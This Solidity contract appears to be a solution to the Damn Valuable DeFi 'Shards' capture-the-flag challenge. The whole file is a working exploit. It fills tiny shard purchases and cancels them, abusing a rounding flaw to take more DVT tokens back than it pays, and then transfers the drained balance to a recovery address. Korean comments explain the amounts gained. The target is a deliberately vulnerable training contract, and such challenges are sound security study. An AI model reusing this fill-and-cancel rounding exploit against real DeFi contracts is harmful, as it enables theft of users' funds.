pragma solidity =0.8.25;

import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";

contract Attack {
    ShardsNFTMarketplace marketplace;
    DamnValuableToken token;
    address recovery;

    constructor(address _marketplace, address _token, address _recovery) {
        token = DamnValuableToken(_token);
        marketplace = ShardsNFTMarketplace(_marketplace);
        recovery = _recovery;
        
        token.approve(address(marketplace), type(uint256).max);
    }

    function fillAndCancel() public {
        uint64 offerId = 1;
        uint256 purchaseIndex;

        // shard 1wei개 구매 및 취소 요청 => 0DVT 지불하여 75e9wei DVT를 확보
        purchaseIndex = marketplace.fill(offerId, 1);
        marketplace.cancel(offerId, purchaseIndex);

        // shard 2e6개 구매 및 취소 요청 => 1500wei DVT 소모하여 0.15DVT를 확보
        purchaseIndex = marketplace.fill(offerId, 2e6);
        marketplace.cancel(offerId, purchaseIndex);

        token.transfer(recovery, token.balanceOf(address(this)));

    }

}